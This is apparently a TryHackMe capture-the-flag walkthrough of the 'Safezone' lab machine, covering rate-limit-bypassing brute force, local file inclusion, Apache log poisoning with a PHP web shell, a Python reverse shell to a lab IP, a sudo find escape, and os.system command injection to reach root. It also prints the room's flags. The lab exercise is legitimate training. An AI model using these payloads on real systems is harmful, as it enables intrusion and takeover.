# Tryhackme.com Room : Safezone

`https://tryhackme.com/room/safezone

## Instance

```bash
export IP="10.10.152.209"
```

## Nmap

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:6a:cd:1b:0c:69:a1:3b:6c:52:f1:22:93:e0:ad:16 (RSA)
|   256 84:f4:df:87:3a:ed:f2:d6:3f:50:39:60:13:40:1f:4c (ECDSA)
|_  256 9c:1e:af:c8:8f:03:4f:8f:40:d5:48:04:6b:43:f5:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Whoami?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Initial Foothold

We have a static webpage with nothing interesting on it. 

Let's run `gobuster` to see if we can find something



Actually, when we look at `/index.php` we are greeted with a login form

We can register using `/register.php`



There is a bunch of hints in there.



In html comments on `/detail.php` :

```
try to use "page" as GET parameter
```

On `/news.php` :

```
I have something to tell you , it's about LFI or is it RCE or something else?
```

Hmmm.. been looking around for a little while. Can't find anything usefull.

Tried fuzzing the `?page` parameter but didn't get any hits



Tried to include some php using the `user` field. The php is not executed



There is a `/note.txt` file 

```
Message from admin :-

		I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .
```



Soo after fuzzing the `page` parameter for a while, I had a look at a write up to get some hints.

Apparently there is an `Apache` settings that allow the access to the `home` directory  using `/~[USER]/`



We can retrieve the `/home/files/pass.txt` file by visiting `/~files/pass.txt`

```
Admin password hint :-

		admin__admin

				" __ means two numbers are there , this hint is enough I think :) "
```

Soo, seems like we need to bruteforce the admin password ?

Although, in our exploration phase we registered an `admin` account, hopefully this won't interfere..



Hmmm also, we see that there is a rate limiting. When we enter 3 times the wrong password we get locked out for 60 secs.



Seems like we can go around this constraint by logging into a valid account between our trials.



Crafted this little python script to retrieve the password :

```python
import requests

# Need to have registred a user with creds user:password before running this script
def valid_login(sess):
	sess.post('http://safezone.thm/index.php', data={
		'username': 'user',
		'password': 'password',
		'submit': 'Submit'
	})

	sess.get('http://safezone.thm/logout.php')


def try_comb(sess, user='koko', passwd='koko'):
	resp = sess.post('http://safezone.thm/index.php', data={
		'username': user,
		'password': passwd,
		'submit': 'Submit'
	}).content.decode()

	return 'window.location.href' in resp


s = requests.Session()

trying = 0

while trying < 100:
	passwd = f"admin{trying:02d}admin"

	print(f"Trying password : {passwd}")

	is_valid = try_comb(s, user='admin', passwd=passwd)

	if is_valid:
		print(f"\nFound valid password : {passwd}")
		break

	# Reset login attemps
	valid_login(s)

	trying += 1

print("Done")
```



We find that the admin password is 

```
admin44admin
```



We can then login as admin and we see a form on `/detail.php` called `whoami`

When we enter a username, we get the user infos :

```
{"id":"551","username":"admin","password":"admin44admin","is_admin":"true"}
```



I was fiddling with the `?page` parameter still and I saw that some stuff were printed when i was doing a `whoami` request with the `?page` parameter. Tried with `?page=/etc/passwd` and we got the content of the file :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
yash:x:1000:1000:yash,,,:/home/yash:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
files:x:1001:1001:,,,:/home/files:/bin/bash
```



We see that we have users named `yash` , `files` and `root` with shells



Tried to access files in `/home/yash` to retrieve an ssh key but seems like we don't have access (tried retrieving the content of `.bashrc`)

We are probably running this as `www-data` so we don't have access.



didn't find any usefull infos in `/etc/ssh/sshd_config` 

Can't read `/etc/shadow`

Hmm, what file can we retrieve to get a foothold in the box ?



I retrieved the code for the php page using `/detail.php?page=php://filter/convert.base64-encode/resource=/var/www/html/detail.php`

```php
<?php
$con=mysqli_connect("localhost","root","myrootpass","db");
session_start();
if(isset($_SESSION['IS_LOGIN']))
{
$is_admin=$_SESSION['isadmin'];
echo "<h2 style='color:Tomato;margin-left:100px;margin-top:-80px'>Find out who you are :) </h2>";
echo "<br><br><br>";
if($is_admin==="true")
{
echo '<div style="align:center;" class="divf">';
echo '<form class="box" method="POST" style="text-align:center">';
echo '<input required AUTOCOMPLETE="OFF" style="text-align:center;" type="text" placeholder="user" name="name"><br><br>';
echo '<input type="submit" value="whoami" name="sub">';
echo '</form>';
echo '</div>';
if(isset($_GET["page"]))
{
                $page=$_GET["page"];
                $file = str_replace(array( "../", "..\"" ), "", $page );
                echo $file;
                include($file);
}
$formuser=mysqli_real_escape_string($con,$_POST['name']);
if(isset($_POST['sub']))
        {
                $sql="select * from user where username='$formuser'";
                $details = mysqli_fetch_assoc(mysqli_query($con,$sql));
                $det=json_encode($details);
                echo "<pre style='color:red;font-size:14px'>$det</pre>";
                $msg="Details are saved in a file";
                echo "<script>alert('details saved in a file')</script>";
        }
}
else
{
echo "<h3 style='color:red;text-align:center'>You can't access this feature!'</h3>";
}
}
else
{
header('Location: index.php');
}

?>
```

We confirm the lfi and we see that we don't need the post request to trigger the lfi, the text is just black on black.



Don't think we can do much with the `whoami` request. The parameter is escaped so no sql injection.



A way to get RCE is to include `/var/log/apache2/access.log` and include rce code by using our useragent.

Unfortunately, the access log was already polluted by our gobuster and nikto scan. So let's just restart the box to clear it out and insert an rce payload.



After some unsucessfull attempts with `curl` and `User-Agents`, I ended up using the `path` of the request to inject our command runner. Using netcat was the easiest, easier to pass symbols.

```
nc 10.10.46.79 80
GET /<?php system($_GET['cmd']); ?>
```

Now we have code execution using `?cmd=ls`.

Let's get a revshell. 
Tried to get the shell with bash revshell but it didn't work

Then with `python`, worked when I used `python3` :
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.32.20",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

We now have a shell, but we need access to `yash` account

## Lateral movement
We are `www-data` we need access to `yash`.

`sudo -l` gives us :
```
User www-data may run the following commands on safezone:
    (files) NOPASSWD: /usr/bin/find
```

We first get access to `files` with
```
sudo -u files find . -exec /bin/sh \; -quit
```

There is a file `/home/files/.something#fake_can@be\^here `

```
files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.
```

Maybe a password hash ? Could get us a stable ssh shell.



Cracked the password with `john` :

```
files:magic
```

We now have a stable shell via ssh.



`sudo -l` gives us :

```
User files may run the following commands on safezone:
    (yash) NOPASSWD: /usr/bin/id
```

Welll, not much help. can't modify the binary, belongs to root...

`/opt/` permission denied, belongs to `yash` user



There is a `php-fpm`/`Nginx` service running as `yash`

I think it's running on port 8000



Looking at `/etc/nginx/nginx.conf` 

```
server {
        listen 127.0.0.1:8000 default_server;
        #listen [::]:8000 default_server;

        # SSL configuration
        #
        # listen 443 ssl default_server;
        # listen [::]:443 ssl default_server;
        #
        # Note: You should disable gzip for SSL traffic.
        # See: https://bugs.debian.org/773332
        #
        # Read up on ssl_ciphers to ensure a secure configuration.
        # See: https://bugs.debian.org/765782
        #
        # Self signed certs generated by the ssl-cert package
        # Don't use them in a production server!
        #
        # include snippets/snakeoil.conf;

        root /opt;

        # Add index.php to the list if you are using PHP
        index index.php index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }


        # pass PHP scripts to FastCGI server
        #
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;

        #       # With php-fpm (or other unix sockets):
                fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
        #       # With php-cgi (or other tcp sockets):
        #       fastcgi_pass 127.0.0.1:9000;
        }
```



Seems like it serves files in `/opt` 

Found an exploit for `php-fpm` but we need to find a valid `.php` file in `:8000/` 

I forwarded the ports with `ssh -L 7000:127.0.0.1:8000 files@safezone.thm`

Running gobuster on the website.. no luck so far



In the meantime, I runned `linpeas` and found :

```
Socket /run/user/1001/snapd-session-agent.socket owned by files uses HTTP. Response to /index:
{"type":"error","result":{"message":"method \"GET\" not allowed"}}
Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
```

Might be related to `Dirty sock` exploit ?

Hmmm, tried to exploit it using `https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py` but didn't seem to work.



Back to `php-fpm` we find the file `:8000/pentest.php`

This file contain a query box named `message for yash` and a submit query button.

It does a `POST` request and display the queried text on the page.



seems like the content of the query is escaped. The following are deleted :

```
php
()
$
''
```

Tried with `<?= "someString" ?>`

But it doesn't seem like our php code will be executed

Hmm, what can we do with this ?

The prompt says that it's a message for `yash`, nothing in `/var/spool/mail` tho..



Oh wellll, had a look at a writeup.

First something that I didn't see was a `:8000/login.html` which is just a static webpage showing a login form with hardcoded creds (`user:pass`). A successfull login redirect us to `:8000/pentest.php`.



And the query box actually give us `command execution` ... Tested it by doing a `touch /tmp/pwn` and verified that the file was created on the machine.



Now let's get another revshell i guess

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.32.20",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

But the `python` string get removed so we don't get our callback.

Let's just create a bash script on the server using our `ssh` connection to `files` user and call it from the prompt.

And we are finally `yash` user



`/home/yash/flag1.txt`:

```
THM{c296539f3286a899d8b3f6632fd62274}
```

## Priv esc

running `sudo -l` gives us :

```
User yash may run the following commands on safezone:
    (root) NOPASSWD: /usr/bin/python3 /root/bk.py
```

Running this script, we are asked for a filename, a destination and a password.

It will copy the file to the destination.

We can get the code of `/root/bk.py` by asking the script to copy itself

```python
import subprocess
import os
file = input("Enter filename: ")
location = input("Enter destination: ")
psswd = input("Enter Password: ")

#subprocess.run(["sshpass -p",psswd,"scp","-o","trictHostKeyChecking=no",file,location],shell=True)
os.system("sshpass -p "+psswd+" scp -o StrictHostKeyChecking=no "+file+" "+location+" 2>/dev/null")
```

Here we could probably do some python dependency injection but maybe we can just inject something in the `os.system` command ?

Yep, we can get a root shell by setting `; /bin/bash ;` as the password.

And we are root

`/root/root.txt`

```
THM{63a9f0ea7bb98050796b649e85481845}
```



## Follow up



## End

